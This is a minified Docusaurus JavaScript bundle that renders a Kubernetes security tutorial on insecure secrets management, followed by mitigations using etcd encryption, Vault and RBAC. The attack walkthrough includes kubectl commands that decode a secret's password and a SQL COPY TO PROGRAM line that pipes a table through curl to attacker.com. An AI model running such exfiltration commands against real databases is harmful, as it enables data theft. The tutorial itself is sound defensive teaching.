"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6934],{3731:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>t,toc:()=>o});const t=JSON.parse('{"id":"k8s_security_basics/attack_vectors_examples/insecre_secrets_management","title":"Insecure Secrets Management","description":"Understanding the risks of insecure secrets management in Kubernetes and best practices to securely handle sensitive data.","source":"@site/docs/k8s_security_basics/attack_vectors_examples/insecre_secrets_management.md","sourceDirName":"k8s_security_basics/attack_vectors_examples","slug":"/k8s_security_basics/attack_vectors_examples/insecre_secrets_management","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/insecre_secrets_management","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/k8s_security_basics/attack_vectors_examples/insecre_secrets_management.md","tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"sidebar_position":5,"title":"Insecure Secrets Management","description":"Understanding the risks of insecure secrets management in Kubernetes and best practices to securely handle sensitive data."},"sidebar":"tutorialSidebar","previous":{"title":"Lack of Network Policies","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies"},"next":{"title":"Insecure Secrets Management","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/insecure_secrets_management"}}');var r=n(4848),c=n(8453);const a={sidebar_position:5,title:"Insecure Secrets Management",description:"Understanding the risks of insecure secrets management in Kubernetes and best practices to securely handle sensitive data."},i="Insecure Secrets Management",l={},o=[{value:"\ud83d\udea9 Exploitation Steps: Accessing Insecurely Stored Secrets",id:"-exploitation-steps-accessing-insecurely-stored-secrets",level:2},{value:"1. Decode a Kubernetes Secret",id:"1-decode-a-kubernetes-secret",level:3},{value:"2. Access Sensitive Services Using Exposed Credentials",id:"2-access-sensitive-services-using-exposed-credentials",level:3},{value:"3. Exfiltrate Data from the Database",id:"3-exfiltrate-data-from-the-database",level:3},{value:"\u2705 Result",id:"-result",level:3},{value:"\ud83d\udee1\ufe0f Mitigation Techniques and Fixes",id:"\ufe0f-mitigation-techniques-and-fixes",level:2},{value:"1. Encrypt Secrets at Rest",id:"1-encrypt-secrets-at-rest",level:3},{value:"\u2705 Example Encryption Configuration for etcd",id:"-example-encryption-configuration-for-etcd",level:4},{value:"2. Use External Secret Management Solutions",id:"2-use-external-secret-management-solutions",level:3},{value:"\u2705 Example of Using External Secrets with Kubernetes",id:"-example-of-using-external-secrets-with-kubernetes",level:4},{value:"3. Limit Access to Secrets with RBAC",id:"3-limit-access-to-secrets-with-rbac",level:3},{value:"\u2705 Example of RBAC Policy for Secret Access",id:"-example-of-rbac-policy-for-secret-access",level:4},{value:"\u2705 Key Takeaway",id:"-key-takeaway",level:2}];function d(e){const s={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"insecure-secrets-management",children:"Insecure Secrets Management"})}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"Insecure secrets management"})," in ",(0,r.jsx)(s.strong,{children:"Kubernetes"})," can lead to the ",(0,r.jsx)(s.strong,{children:"exposure of sensitive data"}),", such as ",(0,r.jsx)(s.strong,{children:"API keys"}),", ",(0,r.jsx)(s.strong,{children:"database credentials"}),", and ",(0,r.jsx)(s.strong,{children:"certificates"}),". Storing ",(0,r.jsx)(s.strong,{children:"secrets in plaintext"})," or using ",(0,r.jsx)(s.strong,{children:"insecure backends"})," can make them easily accessible to ",(0,r.jsx)(s.strong,{children:"attackers"}),"."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"-exploitation-steps-accessing-insecurely-stored-secrets",children:"\ud83d\udea9 Exploitation Steps: Accessing Insecurely Stored Secrets"}),"\n",(0,r.jsxs)(s.p,{children:["An attacker identifies ",(0,r.jsx)(s.strong,{children:"Kubernetes Secrets"})," stored in ",(0,r.jsx)(s.strong,{children:"plaintext"}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get secrets -o yaml\n"})}),"\n",(0,r.jsx)(s.h3,{id:"1-decode-a-kubernetes-secret",children:"1. Decode a Kubernetes Secret"}),"\n",(0,r.jsxs)(s.p,{children:["The ",(0,r.jsx)(s.strong,{children:"attacker"})," extracts and ",(0,r.jsx)(s.strong,{children:"decodes"})," a ",(0,r.jsx)(s.strong,{children:"Base64-encoded secret"}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get secret db-secret -o go-template='{{.data.password|base64decode}}'\n"})}),"\n",(0,r.jsx)(s.h3,{id:"2-access-sensitive-services-using-exposed-credentials",children:"2. Access Sensitive Services Using Exposed Credentials"}),"\n",(0,r.jsxs)(s.p,{children:["The ",(0,r.jsx)(s.strong,{children:"attacker"})," uses the ",(0,r.jsx)(s.strong,{children:"decoded credentials"})," to ",(0,r.jsx)(s.strong,{children:"access a database"}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"psql -h <database-ip> -U admin -W\n"})}),"\n",(0,r.jsx)(s.h3,{id:"3-exfiltrate-data-from-the-database",children:"3. Exfiltrate Data from the Database"}),"\n",(0,r.jsxs)(s.p,{children:["The ",(0,r.jsx)(s.strong,{children:"attacker"})," ",(0,r.jsx)(s.strong,{children:"exports sensitive data"})," from the ",(0,r.jsx)(s.strong,{children:"database"})," to an ",(0,r.jsx)(s.strong,{children:"external server"}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"COPY (SELECT * FROM sensitive_data) TO PROGRAM 'curl -X POST -d @- http://attacker.com/upload';\n"})}),"\n",(0,r.jsx)(s.h3,{id:"-result",children:"\u2705 Result"}),"\n",(0,r.jsxs)(s.p,{children:["The attacker can ",(0,r.jsx)(s.strong,{children:"access and exfiltrate sensitive data"}),", causing ",(0,r.jsx)(s.strong,{children:"data breaches"})," and ",(0,r.jsx)(s.strong,{children:"regulatory compliance violations"}),"."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"\ufe0f-mitigation-techniques-and-fixes",children:"\ud83d\udee1\ufe0f Mitigation Techniques and Fixes"}),"\n",(0,r.jsx)(s.h3,{id:"1-encrypt-secrets-at-rest",children:"1. Encrypt Secrets at Rest"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Issue:"})," ",(0,r.jsx)(s.strong,{children:"Secrets"})," stored in ",(0,r.jsx)(s.strong,{children:"etcd"})," are ",(0,r.jsx)(s.strong,{children:"not encrypted by default"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Fix:"})," Enable ",(0,r.jsx)(s.strong,{children:"encryption at rest"})," in the ",(0,r.jsx)(s.strong,{children:"Kubernetes configuration"}),"."]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"-example-encryption-configuration-for-etcd",children:"\u2705 Example Encryption Configuration for etcd"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:"apiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n- resources:\n  - secrets\n  providers:\n  - aescbc:\n      keys:\n      - name: key1\n        secret: c2VjcmV0LWtleS1mb3ItZW5jcnlwdGlvbg==\n  - identity: {}\n"})}),"\n",(0,r.jsx)(s.h3,{id:"2-use-external-secret-management-solutions",children:"2. Use External Secret Management Solutions"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Issue:"})," ",(0,r.jsx)(s.strong,{children:"Kubernetes Secrets"})," alone do not provide ",(0,r.jsx)(s.strong,{children:"advanced security features"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Fix:"})," Integrate with ",(0,r.jsx)(s.strong,{children:"external secret management tools"})," like ",(0,r.jsx)(s.strong,{children:"HashiCorp Vault"}),", ",(0,r.jsx)(s.strong,{children:"AWS Secrets Manager"}),", or ",(0,r.jsx)(s.strong,{children:"Azure Key Vault"}),"."]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"-example-of-using-external-secrets-with-kubernetes",children:"\u2705 Example of Using External Secrets with Kubernetes"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:'apiVersion: secrets-store.csi.x-k8s.io/v1\nkind: SecretProviderClass\nmetadata:\n  name: vault-secrets\nspec:\n  provider: vault\n  parameters:\n    vaultAddress: "https://vault.example.com"\n    roleName: "k8s-role"\n    objects: |\n      array:\n        - objectName: "db-password"\n          secretPath: "secret/data/db"\n          secretKey: "password"\n'})}),"\n",(0,r.jsx)(s.h3,{id:"3-limit-access-to-secrets-with-rbac",children:"3. Limit Access to Secrets with RBAC"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Issue:"})," ",(0,r.jsx)(s.strong,{children:"Lack of access controls"})," allows ",(0,r.jsx)(s.strong,{children:"unauthorized access"})," to ",(0,r.jsx)(s.strong,{children:"secrets"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Fix:"})," Implement ",(0,r.jsx)(s.strong,{children:"Role-Based Access Control (RBAC)"})," to ",(0,r.jsx)(s.strong,{children:"restrict secret access"}),"."]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"-example-of-rbac-policy-for-secret-access",children:"\u2705 Example of RBAC Policy for Secret Access"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:'apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: default\n  name: secret-reader\nrules:\n- apiGroups: [""]\n  resources: ["secrets"]\n  verbs: ["get"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: read-secrets\n  namespace: default\nsubjects:\n- kind: ServiceAccount\n  name: secret-reader-sa\nroleRef:\n  kind: Role\n  name: secret-reader\n  apiGroup: rbac.authorization.k8s.io\n'})}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"-key-takeaway",children:"\u2705 Key Takeaway"}),"\n",(0,r.jsxs)(s.p,{children:["To ",(0,r.jsx)(s.strong,{children:"secure Kubernetes secrets"}),", always:"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Encrypt secrets at rest"})," using ",(0,r.jsx)(s.strong,{children:"etcd encryption"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Integrate external secret management solutions"})," for ",(0,r.jsx)(s.strong,{children:"robust security"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:["Apply ",(0,r.jsx)(s.strong,{children:"RBAC policies"})," to ",(0,r.jsx)(s.strong,{children:"limit access"})," to ",(0,r.jsx)(s.strong,{children:"sensitive data"}),"."]}),"\n"]})]})}function h(e={}){const{wrapper:s}={...(0,c.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>a,x:()=>i});var t=n(6540);const r={},c=t.createContext(r);function a(e){const s=t.useContext(c);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function i(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),t.createElement(c.Provider,{value:s},e.children)}}}]);